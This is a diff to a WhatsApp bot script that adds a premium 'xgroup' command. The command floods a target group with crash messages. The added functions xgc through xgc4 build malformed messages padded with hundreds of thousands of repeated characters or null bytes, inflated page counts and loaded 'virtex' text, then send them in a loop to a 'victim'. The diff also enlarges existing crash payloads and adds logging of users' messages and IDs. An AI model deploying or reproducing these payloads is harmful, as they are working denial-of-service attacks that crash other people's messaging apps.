@@ -19,6 +19,7 @@ const sender = m.key.fromMe ? (viper.user.id.split(':')[0]+'@s.whatsapp.net' || 
 const senderNumber = sender.split('@')[0]
 const pushname = m.pushName || `${senderNumber}`
 const isBot = botNumber.includes(senderNumber)
+const dansyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
 const groupMetadata = isGroup ? await viper.groupMetadata(m.chat).catch(e => {}) : ''
 const groupName = isGroup ? groupMetadata.subject : ''
 const participants = isGroup ? await groupMetadata.participants : ''
@@ -88,8 +89,28 @@ let run = runtime(process.uptime())
 
 
 // Command Yang Muncul Di Console
-if (isCmd) {
-console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ 𝐙𝐘𝐍 𝐓𝐙𝐘 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
+if (m.message && m.isGroup) {
+    console.log(`
+┌────────── [ GROUP CHAT LOG ] ──────────┐
+│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
+│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
+│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
+│ 🏠 Group     : ${chalk.yellow(groupName)} (${chalk.cyan(m.chat)})
+└────────────────────────────────────────┘
+    `);
+} else {
+    console.log(`
+┌───────── [ PRIVATE CHAT LOG ] ─────────┐
+│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
+│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
+│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
+└────────────────────────────────────────┘
+    `);
+}
+
+if (isCmd && !isUser) {
+dansyaverifikasiuser.push(sender)
+fs.writeFileSync('./database/user.json', JSON.stringify(dansyaverifikasiuser, null, 2))
 }
 
         // Days
@@ -212,6 +233,7 @@ const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))
 // Cek Database
 const isContacts = contacts.includes(sender)
 const isPremium = prem.includes(sender)
+const isUser = dansyaverifikasiuser.includes(sender)
 const isOwner = ownerNumber.includes(senderNumber) || isBot
 
 // BUTTON VIDEO
@@ -377,9 +399,33 @@ const wanted = {
 			});
 		}
 		
+		async function xgc4(target) {
+            try {
+                const messsage = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: '33333333333333333@newsletter',
+                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(120000),
+                                jpegThumbnail: "",
+                                caption: "ꦽ".repeat(120000),
+                                inviteExpiration: Date.now() + 1814400000,
+                            },
+                        },
+                    },
+                };
+                await viper.relayMessage(target, messsage, {
+                    userJid: target,
+                });
+            }
+            catch (err) {
+                console.log(err);
+            }
+        }
+		
 		    async function XeonXRobust(target, o, Ptcp = true) {
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
-	const ui = 'ꦽ'.repeat(1500);
+	const ui = 'ꦽ'.repeat(70000);
    await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
@@ -498,7 +544,7 @@ quotedMessage: {
                     footerText: "🦄드림 가이 Xeon",
                     buttons: [
                         {
-                            buttonId: "\u0000".repeat(200000),
+                            buttonId: "\u0000".repeat(150000),
                             buttonText: {
                                 displayText: "🦄드림 가이 Xeon"
                             },
@@ -2197,6 +2243,117 @@ for (let i = 0; i < 10; i++) {
     [Xreturn]
   );
 break;
+
+	case 'xgroup':
+	if (!isPremium) return replygcxeon(mess.premium)
+	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .group-id link `)
+victim = text.split("|")[0]
+async function xgc4(victim) {
+            try {
+                const messsage = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: '33333333333333333@newsletter',
+                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(120000),
+                                jpegThumbnail: "",
+                                caption: "ꦽ".repeat(120000),
+                                inviteExpiration: Date.now() + 1814400000,
+                            },
+                        },
+                    },
+                };
+                await viper.relayMessage(victim, messsage, {
+                    userJid: victim,
+                });
+            }
+            catch (err) {
+                console.log(err);
+            }
+        }
+async function xgc(victim){
+	viper.relayMessage(victim,{                viewOnceMessage: {
+message: {
+                        messageContextInfo: {
+                            deviceListMetadataVersion: 2,
+                            deviceListMetadata: {},
+                        }, 
+    "extendedTextMessage": {
+        "text": "🦄드림 가이 Xeon" ,
+        "previewType": true,
+        "contextInfo": {
+            "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
+            "participant": "5518998215209@s.whatsapp.net",
+            "quotedMessage": { "documentMessage": {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > ursoziingod & crash;"}}}},
+       }}},{})
+	}
+	
+	async function xgc2(victim){
+		await viper.relayMessage(victim, {
+'groupInviteMessage': {
+"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
+"groupName":` 🦄드림 가이 Xeon`.repeat(1500),
+'groupJid': '120363047626537933@g.us',
+'inviteExpiration': '999',
+'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
+"inviteCode": 'h+64P9RhJDzgXSPf',
+'contextInfo': {
+'isForwarded': true,
+'fromMe': false,
+'participant': '0@s.whatsapp.net',
+'remoteJid': sender,
+'quotedMessage': {
+documentMessage: {
+url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
+mimetype: "application/pdf",
+title: "crash",
+pageCount: 1000000000,
+fileName: "crash.pdf".repeat(1500),
+contactVcard: true
+}
+},
+'forwardedNewsletterMessageInfo': {
+'newsletterJid': '120363222395675670@newsletter',
+'serverMessageId': 1,
+'newsletterName': "🦄드림 가이 Xeon".repeat(1500)
+}
+}
+}
+}, {});
+		}
+		async function xgc3(victim){
+			const mangeak = fs.readFileSync("./database/virtex/mangeak.js")
+await viper.relayMessage(
+      victim,
+      {
+ viewOnceMessage: {
+                  message: {
+                     messageContextInfo: {
+                        deviceListMetadataVersion: 2,
+                        deviceListMetadata: {},
+                     },
+  scheduledCallCreationMessage: {
+"scheduledTimestampMs": Date.now(),
+         callType: 1,
+         title: `🦄드림 가이 Xeon` + mangeak
+    }
+    
+  },                   
+                                       },
+                                                      },
+      {quoted : victim })
+			}
+		
+for (let i = 0; i < 10; i++) {
+	await xgc4(victim);
+	await xgc3(victim);
+await xgc(victim); 
+await xgc2(victim);
+await xgc3(victim);
+await xgc4(victim);
+await sleep(10000); // Delay for 5 seconds
+    }
+break
 
 case "owner": {
 if (!isPremium) return reply('Mau Ngapain Dek ??')
